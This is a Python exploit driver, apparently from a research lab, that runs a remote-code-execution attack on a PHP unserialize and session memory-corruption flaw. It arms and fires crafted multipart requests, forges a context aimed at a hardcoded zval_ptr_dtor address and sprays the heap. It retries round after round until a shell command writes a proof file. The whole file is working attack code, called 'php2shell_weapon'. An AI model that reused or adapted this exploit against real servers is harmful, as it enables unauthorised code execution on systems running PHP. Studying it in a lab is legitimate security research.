#!/usr/bin/env python3
"""RCE driver v3: the receipt sequence (arm -> fire SAME sid, no p1) with the
real zval_ptr_dtor aimed forged context + t[] object block.
If the fire wedges on the leaked flock, restart the child and try again."""
import os
import sys, time, subprocess, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P
import php2shell_weapon as W

W.CALL_DELTA = 0xD370
URL = "http://127.0.0.1:18120/index.php"
DTOR = 0x7ffff6906380
CMD = b"id > /tmp/php2shell_rce_proof.txt"
BND = b"UctxPoc2026"

def fresh_lab():
    subprocess.run(["bash", "/tmp/php2shell_ap/rce_lab.sh"],
                   stdout=subprocess.DEVNULL, check=True)

def alive():
    return subprocess.run(["curl", "-s", "-o", "/dev/null", "-m", "3", URL]).returncode == 0

ARM_FILES, NAMELEN, SPRAY = 20, 98304, 200
ROUNDS = 10

fresh_lab()
small = W.call_forge(CMD, DTOR)
for r in range(1, ROUNDS + 1):
    sid = ("r%031d" % r)
    arm = P.arm_body(sid, BND, ARM_FILES, NAMELEN)
    st, d, dt = W.safe_send(URL, arm, BND, sid, 0.0, 0)
    oom = (st == 500)
    ctx = P.forge_ctx(DTOR, DTOR, used=1018, data0=DTOR)
    body = P.fire_body(sid, BND, SPRAY, ctx, n_small=W.T_COUNT, t_small=small)
    st2, d2, dt2 = W.safe_send(URL, body, BND, sid, 0.0, 0)
    hit = b"4141414141414141" in d2.hex().encode()
    print("round %d arm=%s fire=%s dt=%.2f markerhit=%s %s"
          % (r, st, st2, dt2, hit, d2[:60]), flush=True)
    if os.path.exists("/tmp/php2shell_rce_proof.txt"):
        print("=== RCE PROOF ===")
        print(open("/tmp/php2shell_rce_proof.txt").read())
        break
    if not alive():
        print("  child dead/wedged; restarting lab")
        time.sleep(0.5)
        fresh_lab()
print("done")
